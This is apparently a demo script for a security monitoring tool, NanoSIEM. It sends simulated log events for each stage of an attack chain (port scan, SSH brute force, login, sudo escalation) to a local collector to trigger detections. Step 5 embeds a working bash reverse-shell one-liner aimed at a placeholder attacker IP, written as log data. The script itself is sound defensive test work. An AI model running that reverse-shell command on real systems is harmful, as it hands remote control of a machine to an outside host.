#!/usr/bin/env bash
HOST=${1:-localhost}
SYSLOG_PORT=${2:-5140}
JSON_PORT=${3:-5141}
ATTACKER_IP="203.0.113.5"

echo ""
echo "  NanoSIEM Kill Chain Demo"
echo "  Target: ${HOST}:${SYSLOG_PORT} (syslog) / ${HOST}:${JSON_PORT} (JSON)"
echo "  Simulated attacker: ${ATTACKER_IP}"
echo ""

send_syslog() {
    echo "$1" | nc -q1 "${HOST}" "${SYSLOG_PORT}" 2>/dev/null
    echo "  → Sent: ${2}"
    sleep 0.4
}

send_json() {
    echo "$1" | nc -q1 "${HOST}" "${JSON_PORT}" 2>/dev/null
    echo "  → Sent: ${2}"
    sleep 0.4
}

echo "  [Step 1] Reconnaissance — port scan"
send_syslog \
  "CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=${ATTACKER_IP} spt=12345 dst=10.0.0.1 dpt=22 cnt=500" \
  "CEF port scan alert"

echo ""
echo "  [Step 2] Credential Access — brute force x3"
send_syslog \
  "<34>1 2026-06-02T03:00:01Z web-01 sshd 1234 - - Failed password for root from ${ATTACKER_IP} port 22 ssh2" \
  "Brute force attempt 1"
send_syslog \
  "<34>1 2026-06-02T03:00:03Z web-01 sshd 1234 - - Failed password for root from ${ATTACKER_IP} port 22 ssh2" \
  "Brute force attempt 2"
send_syslog \
  "<34>1 2026-06-02T03:00:05Z web-01 sshd 1234 - - Failed password for invalid user admin from ${ATTACKER_IP} port 22 ssh2" \
  "Brute force attempt 3"

echo ""
echo "  [Step 3] Initial Access — successful login"
send_syslog \
  "<34>1 2026-06-02T03:01:00Z web-01 sshd 1235 - - Accepted password for deploy from ${ATTACKER_IP} port 54321 ssh2" \
  "Successful SSH login"

echo ""
echo "  [Step 4] Privilege Escalation — sudo to root"
send_syslog \
  "<86>1 2026-06-02T03:02:00Z web-01 sudo 5678 - - deploy ran COMMAND=/bin/bash as root uid=0 euid=0" \
  "Sudo privilege escalation"

echo ""
echo "  [Step 5] Command and Control — reverse shell (ML only, no Sigma rule)"
send_json \
  '{"host":"web-01","process":"bash","message":"/bin/bash -i >& /dev/tcp/'"${ATTACKER_IP}"'/4444 0>&1","level":"critical","timestamp":"2026-06-02T03:03:00Z"}' \
  "Reverse shell beacon"

echo ""
echo "  Kill chain complete. Check Terminal 1 for detections."
echo "  Expected: SIGMA hits, CHAIN alerts, ML anomalies, STIX bundles"
echo ""
